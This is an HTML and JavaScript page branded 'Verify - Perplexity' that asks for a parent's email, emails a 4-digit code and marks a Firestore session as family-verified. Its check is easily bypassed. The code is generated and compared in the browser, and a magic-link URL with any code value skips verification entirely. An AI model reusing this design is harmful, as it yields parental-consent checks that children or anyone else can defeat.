<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify - Perplexity</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        :root { --primary-bg: #fff; --text-main: #000; --accent: #202124; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--primary-bg); display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; padding: 20px; text-align: center; }
        
        .container { max-width: 400px; width: 100%; }
        .close-btn { position: absolute; top: 20px; right: 20px; cursor: pointer; background: #f0f0f0; border-radius: 50%; padding: 8px; width: 30px; height: 30px; display: flex; align-items: center; justify-content: center; }
        
        /* SVG Animation Styling */
        .icon-box { position: relative; width: 100px; height: 100px; margin: 0 auto 20px; }
        .plane-svg { width: 100%; height: 100%; stroke-dasharray: 1000; stroke-dashoffset: 1000; animation: draw 3s ease-in-out infinite; }
        @keyframes draw { to { stroke-dashoffset: 0; } }

        h1 { font-size: 32px; font-weight: 500; margin-bottom: 10px; color: var(--text-main); }
        p { color: #666; font-size: 15px; line-height: 1.5; margin-bottom: 30px; }
        .email-display { font-weight: bold; color: #444; }

        /* OTP Input Styling */
        .otp-container { display: flex; justify-content: center; gap: 10px; margin-bottom: 30px; }
        .otp-input { width: 50px; height: 65px; border: 1px solid #ddd; border-radius: 12px; font-size: 24px; text-align: center; outline: none; background: #fff; }
        .otp-input:focus { border-color: #000; box-shadow: 0 0 0 1px #000; }

        input[type="email"] { width: 100%; padding: 15px; border-radius: 8px; border: 1px solid #ddd; margin-bottom: 15px; box-sizing: border-box; }

        .btn-confirm { width: 100%; padding: 16px; background: #bebebe; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.3s; }
        .btn-confirm.active { background: #1a1a1a; cursor: pointer; }
        
        .hidden { display: none; }
        #status-msg { margin-top: 15px; font-size: 13px; color: #d93025; }
    </style>
</head>
<body>

<div class="close-btn" onclick="window.location.reload()">✕</div>

<div class="container">
    <!-- Icon Section -->
    <div class="icon-box">
        <svg viewBox="0 0 100 100" class="plane-svg" fill="none" stroke="black" stroke-width="1.5">
            <circle cx="50" cy="50" r="45" stroke="#eee" />
            <path d="M30,50 L70,30 L60,70 L50,55 L30,50 Z M50,55 L70,30" />
            <path d="M40,65 Q45,75 55,65" stroke-dasharray="4,4" />
        </svg>
    </div>

    <div id="setup-view">
        <h1>Verify Parental Access</h1>
        <p>Enter your parent's email to receive a 4-digit verification code or magic link.</p>
        <input type="email" id="parentEmailInput" placeholder="parent@example.com">
        <button class="btn-confirm active" id="sendBtn">Send Code</button>
    </div>

    <div id="verify-view" class="hidden">
        <h1>Check your email</h1>
        <p>A temporary sign-in link has been sent to <br><span class="email-display" id="targetEmail"></span></p>
        
        <div class="otp-container">
            <input type="text" class="otp-input" maxlength="1" oninput="moveFocus(this, 0)">
            <input type="text" class="otp-input" maxlength="1" oninput="moveFocus(this, 1)">
            <input type="text" class="otp-input" maxlength="1" oninput="moveFocus(this, 2)">
            <input type="text" class="otp-input" maxlength="1" oninput="moveFocus(this, 3)">
        </div>

        <button class="btn-confirm" id="confirmBtn" disabled>Confirm</button>
    </div>
    
    <div id="status-msg"></div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getFirestore, doc, getDoc, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

    const firebaseConfig = {
        projectId: "question-metabase",
        // Add your other config keys here...
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);
    emailjs.init("Yr9MutUoHOEONnFgn");

    const urlParams = new URLSearchParams(window.location.search);
    const sessionId = urlParams.get('session');
    const magicCode = urlParams.get('code');
    const pEmail = urlParams.get('pEmail');

    let correctOtp = "";

    async function init() {
        if (!sessionId) return;

        // --- Handle Magic Link ---
        if (magicCode && pEmail) {
            document.getElementById('setup-view').innerHTML = "<h1>Verifying link...</h1>";
            await finalize(pEmail);
            return;
        }

        // --- Fetch Session Data ---
        const docRef = doc(db, "ASPX Keys", sessionId);
        const snap = await getDoc(docRef);
        if (snap.exists()) {
            const data = snap.data();
            if (data.family === "no" || data.family === "busniess") {
                window.location.href = "6.html";
            }
        }
    }

    document.getElementById('sendBtn').onclick = async () => {
        const email = document.getElementById('parentEmailInput').value;
        if (!email.includes('@')) return alert("Enter valid email");

        correctOtp = Math.floor(1000 + Math.random() * 9000).toString();
        
        const params = {
            email: email,
            session: sessionId,
            otp: correctOtp
        };

        try {
            await emailjs.send('service_1ij08zn', 'template_qxz1wka', params);
            document.getElementById('setup-view').classList.add('hidden');
            document.getElementById('verify-view').classList.remove('hidden');
            document.getElementById('targetEmail').innerText = email;
        } catch (e) {
            alert("Error sending email. Check console.");
        }
    };

    // UI Input Logic
    window.moveFocus = (el, index) => {
        if (el.value.length === 1 && index < 3) {
            document.querySelectorAll('.otp-input')[index + 1].focus();
        }
        checkInputs();
    };

    function checkInputs() {
        const inputs = document.querySelectorAll('.otp-input');
        const code = Array.from(inputs).map(i => i.value).join('');
        const btn = document.getElementById('confirmBtn');
        if (code.length === 4) {
            btn.classList.add('active');
            btn.disabled = false;
        } else {
            btn.classList.remove('active');
            btn.disabled = true;
        }
    }

    document.getElementById('confirmBtn').onclick = async () => {
        const entered = Array.from(document.querySelectorAll('.otp-input')).map(i => i.value).join('');
        if (entered === correctOtp) {
            await finalize(document.getElementById('targetEmail').innerText);
        } else {
            alert("Incorrect code");
        }
    };

    async function finalize(parentEmail) {
        try {
            const docRef = doc(db, "ASPX Keys", sessionId);
            await updateDoc(docRef, {
                family: "commited",
                guardians: parentEmail,
                updatedAt: new Date().toISOString()
            });
            window.location.href = "6.html";
        } catch (e) {
            console.error(e);
        }
    }

    init();
</script>
</body>
</html>
